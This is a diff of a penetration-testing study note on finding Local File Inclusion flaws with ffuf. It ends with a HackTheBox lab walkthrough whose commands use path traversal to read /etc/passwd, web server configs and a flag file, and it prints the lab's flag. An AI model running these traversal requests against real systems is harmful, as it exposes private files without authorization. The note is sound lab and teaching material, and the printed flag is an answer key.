@@ -4,13 +4,13 @@
 
 ## When to Use Automation
 
-Manual exploitation is more reliable and finds bugs automation misses. But automation is great for:
-- Wide-net testing across many parameters/endpoints
+Manual exploitation is more reliable and finds bugs that automation misses. But automation is useful for:
+- Wide-net testing across many parameters and endpoints
 - Trying every known bypass payload in seconds
 - Finding hidden parameters not exposed in the UI
 - Quickly mapping server files (webroot, logs, configs)
 
-Three steps: **fuzz parameters → fuzz LFI payloads → fuzz server files**.
+Three steps: **fuzz parameters → fuzz LFI (Local File Inclusion) payloads → fuzz server files**.
 
 ---
 
@@ -30,8 +30,7 @@ ffuf -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
 # Anything with a different size = candidate parameter
 awk -F, 'NR>1 && $5!=""' /tmp/param.csv
 ```
-
-> Why filter on baseline size: pages render the same body when params are ignored. A size difference means the server actually processed the param.
+> Gets the baseline response size, then fuzzes GET parameter names. The `-fs` flag filters out responses matching the baseline size, so only pages that actually reacted to the parameter are shown. Results saved to CSV for review.
 
 Also try POST:
 ```bash
@@ -40,6 +39,7 @@ ffuf -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -u "http://TARGET/index.php" -fs $SIZE
 ```
+> Same fuzz but for POST parameters. The `-X POST` and `-d` flags send form data. Use both GET and POST fuzzing since hidden parameters may exist in either method.
 
 ---
 
@@ -52,6 +52,7 @@ ffuf -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
      -u "http://TARGET/index.php?view=FUZZ" \
      -fs $BASELINE_SIZE -t 50
 ```
+> Fuzzes the `view` parameter with every LFI payload in Jhaddix's list. Filters out baseline-sized responses. Any result with a different size likely shows file content. Swap `view` for the parameter name you discovered in Step 1.
 
 Other available LFI wordlists on Kali:
 | Wordlist | Path | Use |
@@ -75,6 +76,7 @@ ffuf -w ~/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FU
      -u "http://TARGET/index.php?view=../../../../FUZZ/index.php" \
      -fs $BASELINE_SIZE
 ```
+> Brute-forces common webroot paths through the LFI parameter — a non-baseline size means that webroot resolved. Swap `view`, `TARGET`, and `$BASELINE_SIZE` for your target.
 
 Common Linux webroots:
 ```
@@ -99,6 +101,7 @@ ffuf -w ~/SecLists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt:FUZZ \
      -u "http://TARGET/index.php?view=../../../../FUZZ" \
      -fs $BASELINE_SIZE
 ```
+> Fuzzes for every known `/etc/` file from Debian package metadata. Any response with a size different from baseline contains a real file. Slower than a short list but very thorough.
 
 Read Apache config to find webroot + log paths:
 ```bash
@@ -110,12 +113,14 @@ curl "http://TARGET/index.php?view=../../../../etc/apache2/apache2.conf"
 curl "http://TARGET/index.php?view=../../../../etc/apache2/envvars"
 # export APACHE_LOG_DIR=/var/log/apache2
 ```
+> Reads the Apache main config to find the webroot and log file paths. Then reads `envvars` to resolve `${APACHE_LOG_DIR}` to a real path. Use these paths for log poisoning.
 
 ### Cross-reference for nginx:
 ```bash
 curl "http://TARGET/index.php?view=../../../../etc/nginx/nginx.conf"
 curl "http://TARGET/index.php?view=../../../../etc/nginx/sites-enabled/default"
 ```
+> Reads nginx config files to find the webroot and log paths. The `sites-enabled/default` file shows the active virtual host config including `access_log` and `root` directives.
 
 ---
 
@@ -143,6 +148,7 @@ In practice, `ffuf` + manual exploitation beats every dedicated LFI tool. Skip t
 ffuf -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
      -u "http://154.57.164.66:31212/index.php?FUZZ=test" -fs 2309 -t 50
 ```
+> Fuzzes every common GET parameter name. Responses with a different size from the baseline (2309) reacted to the parameter — those are candidates for further testing.
 
 Hit: **`view`** (size 1935 — different from baseline)
 
@@ -152,6 +158,7 @@ Hit: **`view`** (size 1935 — different from baseline)
 curl -sk "http://154.57.164.66:31212/index.php?view=../../../../etc/passwd"
 # → no output — basic traversal is filtered/missing
 ```
+> Confirms whether a simple 4-level traversal works. No output means the path is either filtered or the traversal depth is wrong.
 
 ### Step 3 — Fuzz with LFI-Jhaddix
 
@@ -159,6 +166,7 @@ curl -sk "http://154.57.164.66:31212/index.php?view=../../../../etc/passwd"
 ffuf -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
      -u "http://154.57.164.66:31212/index.php?view=FUZZ" -fs 1935 -t 50
 ```
+> Tries hundreds of LFI bypass variants including different traversal depths and encoding styles. Filters out the known non-LFI response size (1935) so only successful file reads appear.
 
 Hits — multiple variants of `../../../../../etc/passwd` with **18+ traversal levels** worked:
 ```
@@ -173,6 +181,7 @@ The pattern: shallower (4 levels) was filtered, but deeper traversal (18+ levels
 curl -sk "http://154.57.164.66:31212/index.php?view=../../../../../../../../../../../../../../../../../../../../../flag.txt" \
   | grep -oE 'HTB\{[^}]+\}'
 ```
+> Uses the 18-level traversal confirmed by ffuf to read `/flag.txt`. The `grep` extracts just the flag string from the surrounding HTML.
 
 **Flag:** `HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}`
 
